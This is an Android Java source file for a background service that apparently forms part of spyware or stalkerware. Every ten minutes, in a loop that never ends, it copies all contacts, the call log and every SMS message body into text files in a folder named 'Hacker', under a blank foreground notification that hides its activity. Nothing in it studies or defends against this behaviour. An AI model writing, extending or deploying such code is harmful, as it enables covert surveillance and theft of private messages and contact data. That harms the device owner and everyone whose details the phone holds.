package com.hello.contacts;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;


public class MyForegroundService extends Service {
    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            while (true){
                Log.e("Service", "Serice Foreground service");
                try {
                    Thread.sleep(600000);//Every 10 Minutes(600000),6000 means 6 Seconds
                    gettingcontacts();
                    getcalllog();
                    getsms();
                    Log.e("Service", "Writing data");
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

        }).start();
        final String CHANNEL_ID="Foreground Service ID";
        NotificationChannel channel=new NotificationChannel(
                CHANNEL_ID,
                CHANNEL_ID,
                NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
        Notification.Builder notification=new Notification.Builder(this,CHANNEL_ID)
                .setContentText("")
                .setContentTitle("")
                .setSmallIcon(R.drawable.ic_launcher_background);
        startForeground(1001,notification.build());
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    private void getsms() {
        try {
            File SmsFile=new File(getExternalFilesDir(null)+"/Hacker");

            File smswriter=new File(SmsFile,"Sms.txt");
            FileWriter smsw=new FileWriter(smswriter);
            Cursor cursor=getContentResolver().query(Uri.parse("content://sms"),null,null,null,null);
            if(cursor.getCount()>0) {
                while (cursor.moveToNext()) {

                    String Number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String Message = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String Date1 = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    smsw.append("Number : " + Number + "\r\n" + "Message : " + Message + "\r\n" + "Date : " + Date1 + "\r\n");
                    smsw.flush();
                }
            }
            smsw.close();



        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void getcalllog() {
        try {
            File file=new File(getExternalFilesDir(null)+"/Hacker");

            File CallLogs=new File(file,"CallLogs.txt");
            FileWriter callwriter=new FileWriter(CallLogs);
            ContentResolver contentResolver=getContentResolver();
            Uri Call= CallLog.Calls.CONTENT_URI;
            Cursor cursorcallalogs=contentResolver.query(Call,null,null,null,null);
            if(cursorcallalogs.getCount() >0) {
                while(cursorcallalogs.moveToNext()){
                    @SuppressLint("Range") String Name=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    @SuppressLint("Range") String Number=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.NUMBER));
                    @SuppressLint("Range") String Duration=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.DURATION));
                    callwriter.append("Cached_Name : "+Name+"\r\n"+"Number : "+Number+"\r\n"+"Duration : "+Duration+" Seconds\r\n");
                    callwriter.flush();
                }
            }
            callwriter.close();

        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void gettingcontacts(){
        try {
            File file=new File(getExternalFilesDir(null)+"/Hacker");

            File Contacts=new File(file,"Contacts.txt");

            FileWriter writer=new FileWriter(Contacts);

            ContentResolver contentResolver=getContentResolver();
            Uri uri= ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            Cursor cursor=contentResolver.query(uri,null,null,null,null);
            Log.w("Contact Provider Demo", "Total # No of Contacts ::: " +Integer.toString(cursor.getCount()));
            if(cursor.getCount()>0){
                while (cursor.moveToNext()){
                    @SuppressLint("Range") String contactname= cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    @SuppressLint("Range") String phoneNumber= cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    writer.append("Contact Name : "+contactname+" Ph : "+phoneNumber+"\r\n");
                    writer.flush();
                    Log.i("Content Provider","Contact Name ::: "+contactname+" Ph # "+phoneNumber);
                }
                writer.close();
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
}
